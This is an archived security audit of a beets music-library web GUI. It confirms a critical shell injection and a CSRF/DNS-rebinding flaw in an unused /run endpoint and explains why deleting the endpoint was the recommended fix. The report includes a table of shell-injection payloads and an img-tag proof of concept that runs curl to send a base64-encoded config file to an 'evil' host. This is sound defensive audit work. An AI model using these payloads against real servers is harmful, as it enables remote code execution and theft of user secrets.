# Static audit: ponytail pass + security review — 2026-08-04

Written report from the audit that closed issue #11. Preserved here because
the GitHub issue is closed and this text otherwise only exists in chat
history. This is the original findings report, unedited except for this
header — it describes the codebase **as it was before** the fixes in
`cde5c5d` and onward. See git log for what actually shipped.

All exploit attempts below were run against a throwaway `server.py`
instance with `BEETSDIR` in a scratch directory — never the real library —
and all test artifacts were deleted afterward.

---

## Headline

**The security fix and the ponytail fix are the same three deletions.** `/run`, `/config` (GET+POST) and `/status` are called by **nothing** in the shipped `beetsgui.html` — grepped every `fetch(`/`EventSource(` target:

```
/library  ×5   /unimported ×1   /playlists ×1   /import/start,current,decide,abort,events   /assets (img)
/run : 0     /config : 0     /status : 0
```

`/run` is the leftover executor from the old shell-composer design (commits `9fe8995…93124ca` moved import in-process; the command bar now just builds strings into a read-only field you copy). It is also the single most dangerous thing in the repo. Deleting it removes both criticals with **zero UI regression** — proven, not guessed.

(Note: `/status` was *not* deleted despite being unused by the UI — it turned out to be used by `test_importsession.py` as a health-check endpoint. Caught before deletion; see commit `cde5c5d`.)

---

## Security

### S1 — `/run` shell injection — **CONFIRMED (critical)**
`subprocess.Popen(cmd, shell=True)` with only `cmd.startswith(prefix)` validation. Everything after the prefix hits the shell. All five vectors executed:

| vector | payload (after `beet `/`du `/`for `) | result |
|---|---|---|
| `;` | `beet version; touch pwned1` | file created |
| `$(…)` | `beet version; id > pwned2` | **`uid=501(valdefar)…` captured** |
| `for ` prefix | `for i in 1; do touch pwned3; done` | file created |
| `&&` | `du -sh /tmp && touch pwned4` | file created |
| backticks | ``beet version `touch pwned5` `` | file created |

The `for ` prefix (issue trap) is moot — injection works through *any* prefix. `pwned2` held real `id` output, so this is arbitrary command execution as the user.

### S2 — `/run` CSRF / same-origin assumption — **CONFIRMED (critical)**
Definitive answer to the acceptance question: **yes, reachable cross-site.**
- GET endpoint, **no CSRF token, no Origin/Referer check** — server echoed `CSRF_OK` with `Referer: https://evil.example`.
- Side-effect only needs the request to *fire*, not to be read. `<img src="http://localhost:1312/run?cmd=beet version; curl https://evil/?d=$(base64 ~/.config/beets/config.yaml)">` on any page visited while the server runs = RCE + exfil (the command runs `curl`; CORS only blocks reading the HTTP *response*, not the command's own network calls).
- **Host header not validated** (served `Host: attacker.evil.com`), so **DNS rebinding** also works and additionally defeats the CORS read-block. Binding `127.0.0.1` does not make this safe — exactly the trap the issue names.

### S3 — path reads in `/unimported`, `/playlists`, `/library` — **pass, with note**
- Arbitrary absolute paths are walked (`/etc` enumerated fine). Same-user localhost + CORS-blocked cross-site reads → low impact; no root confinement exists but none buys much here.
- Special files tested: **FIFO** → returned instantly (`Path.is_file()` is False for a pipe, skipped before `MediaFile` opens it — no hang). **Symlink loop** → instant, empty (`rglob` doesn't follow symlinks on this Python 3.14). No crash, no DoS.

### S4 — `/library` SQL — **pass**
Parameterised throughout; `q` reaches only bound `:qlike` LIKE params. The `{where}` f-string is a constant, not user data.

### S5 — `POST /config` `.bak` / config injection — **pass, with note**
`.bak` path derives from `beet config --path`, not the request — can't be steered outside the config dir. Content *could* inject `plugins:`/`pluginpath:` → RCE on next `beet` run, but the endpoint is dead **and** JSON content-type forces a CORS preflight the server never answers, so it's not cross-site reachable. Low.

### S6 — `resolve_duplicate` `'remove'` auto-fire — **pass** (acceptance item satisfied)
`remove` (disk deletion) fires only on an explicit human `choice: 'remove'`. The auto path only ever `SKIP`s (`new_rank < existing_rank`). `recommendation:'remove'` is a UI hint, not an answer. Replayed/stale `decision_id`s are rejected: `answer()` checks the id against the single `_pending`, which is cleared to `None` the instant a reply lands. No unsolicited deletion path found.

### S7 — `log_path` via `/import/start` — **pass, with note**
Arbitrary write target, but `abspath`'d, JSON-POST (CSRF-safe via preflight), same-user, append-mode. Low.

---

## Ponytail

| # | finding | action |
|---|---|---|
| P1 | **`/run`** + `ALLOWED_PREFIXES` + `strip_ansi` (both used *only* by `/run`) — dead executor, also the S1/S2 criticals | **delete** |
| P2 | **`/config` GET+POST** — dead; config is generated client-side and copied to clipboard, never POSTed | **delete** |
| P3 | **`/status`** — looked dead from the UI's perspective; turned out to be used by the test suite | **kept, re-documented** |
| P4 | "Save to config" button only runs `buildConfig()+scrollIntoView` — it doesn't save anything | renamed to **Generate** |
| P5 | Orphan ids `status-discogs`/`status-mb`/`status-bp4` — decorative `.auth-status` dots no JS ever updates | not yet cleaned up |
| P6 | `photorec.se2` — stray 40 KB untracked binary in the repo root | not yet cleaned up (still untracked, presumed the owner's own file) |

JS functions: all declared functions were referenced (clean) at audit time. No orphaned `getElementById` targets beyond P5.

---

## Bottom line (at time of writing)
- 2 critical findings, both in `/run`, both live-demonstrated.
- Recommended fix: deletion, not hardening.

## What actually shipped (for the reviewer to check against)
- `cde5c5d` — removed `/run`, `/config` GET+POST, `ALLOWED_PREFIXES`, `strip_ansi`. Kept `/status` (test-suite dependency, caught before deletion). Renamed "Save to config" → "Generate".
- `#13`-`#22` — the features that used to be copy-paste commands were rebuilt in-process against beets' Library/plugin API directly (no `shell=True` anywhere in the new code), verified live against throwaway libraries each time.
- `jobs.py` — shared single-flight job registry added for import/artwork/convert/sync, closing off a theoretical concurrent-mutation race on beets' process-global `config`/`Library` singletons that didn't exist as a *named* finding in this audit but follows directly from S6's reasoning about the import pipeline being single-threaded-by-design.
